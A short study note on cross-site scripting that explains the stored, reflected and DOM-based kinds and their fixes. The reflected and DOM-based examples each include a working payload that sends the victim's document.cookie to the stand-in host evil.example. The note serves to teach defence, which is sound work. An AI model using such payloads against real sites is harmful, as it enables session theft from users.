# XSS - Cross Site Scripting

## Mechanism

* The attacker gets their own JS code to run in the victim's browser inside the vulnreable site's page.
* What is important - the script has the same rights as the site's own code - it can read the page, call the site's APIs
  as the user and read cookies that aren't HttpOnly.

Very frequently XSS leads to stealing cookies, so:

* The cookies that should be safe should be `HttpOnly`.
* There should be a strict Content Security Policy.

## Kinds

### Stored

The script is saved on the server.

Example: a forum post and served to every visitor.

Solution:

1. If you don't need to store HTML, just escape it.
2. If you really need to store and display HTML, create a whitelist of elements (`<b>`, `<a>`) and stip everything else
   (`<script>`, `onerror=`).

### Reflected

The script travels inside a link the victim clicks. The server copies part of the request into the resultant page
without escaping it, so the script runs in the victim's browser as part of the site.

Example:

1. We have a shop with a search and the shop HTML shows what we searched.
2. Link `ourshop.com/search?q=shoes` returns results with a header `<h3>Results for: shoes</h3>`.
3. The attacker sends the victim this link:
   `ourshop.com/search?q=<script>new Image().src='evil.example/c?' + document.cookie</script>`.
4. The victim clicks when logged into the shop.
5. The server puts the query phrase into the page as it came: `<p>Results for: <script>...</script></p>`.
6. The browser runs that script as the shop's own code. It can read shop's cookies (unless they're `HttpOnly`), read the
   page or call the shop's API as the victim.

Solution:

1. Escape output, so the server renders `&lt;script&gt;...` and the browser shows it as text.

### DOM-based

DOM-based XSS works like reflected, but the server plays no part. The site's own JS, running in the browser, takes data
from somewhere the attacker controls, usually the URL, and put into the page as HTML.

Example:

1. Page code has some greeting that takes the name from the URL:
   `document.getElementById("greeting").innerHTML = "Hello, " + name;`.
2. When you enter with `mysite.com/welcome#Karol`, the page shows `"Hello, Karol"`.
3. Attacker sends the link `mysite.com/welcome#<img src=x onerror="new Image().src='https://evil.example/c?'+document.cookie">`.

This is pure FE case, the data does not get to the server.

Solution:

1. Write untrusted data as text, with `textContent` instead of `innerHTML`.